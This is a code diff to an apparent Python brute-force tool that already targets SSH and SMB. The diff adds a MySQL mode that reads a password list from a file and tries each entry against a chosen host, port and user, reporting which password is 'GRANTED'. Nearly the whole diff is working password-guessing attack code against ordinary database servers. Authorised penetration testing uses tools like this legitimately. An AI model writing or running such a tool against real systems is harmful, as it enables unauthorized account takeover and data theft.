@@ -7,6 +7,7 @@ import re
 import paramiko
 from impacket.smbconnection import SMBConnection, SessionError
 import ntstatus
+import mysql.connector
 
 # List and dictonaries
 modes = {
@@ -551,7 +552,7 @@ def smb_3_connect():
                 break
     connection.close()
 
-def mysql():
+def mysql1():
      while True:
         for number, mode in methods.items():
             print(number + ' -> ' + mode)
@@ -574,6 +575,48 @@ def mysql():
             print('Mode not found, please try again.')
 
 def mysql_1_info():
+    while True:
+        info['host'] = input(
+            'Enter the host: '
+        )
+        info['port'] = int(input(
+            'Enter the port: '
+        ))
+        info['user'] = input(
+            'Enter the user: '
+        )
+        passwords_list_file = input(
+            "Please type the file's path containing the passwords' list: "
+        )
+        try:
+            with open(passwords_list_file, 'r', encoding='utf-8') as file:
+                password_list = [line.strip() for line in file]
+        except FileNotFoundError:
+            print('This file does not exist, please try again.')
+        else:
+            return password_list
+
+def mysql_1_connect():
+    password_list = mysql_1_info()
+    for password in password_list:
+        try:
+            connection = mysql.connector.connect(
+                host = info['host'],
+                port = info['port'],
+                user = info['user'],
+                password = password
+            )
+        except mysql.connector.Error:
+            print(f'Login failed with user "{info['user']}" and password "{password}".')
+        else:
+            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
+            break
+
+
+
+
+        
+    
 
 
         
@@ -606,7 +649,7 @@ def input_mode():
             smb()
             return None
         elif selected_mode == 'e':
-            mysql()
+            mysql1()
             return None
         else:
             print('Mode not found, please try again.')
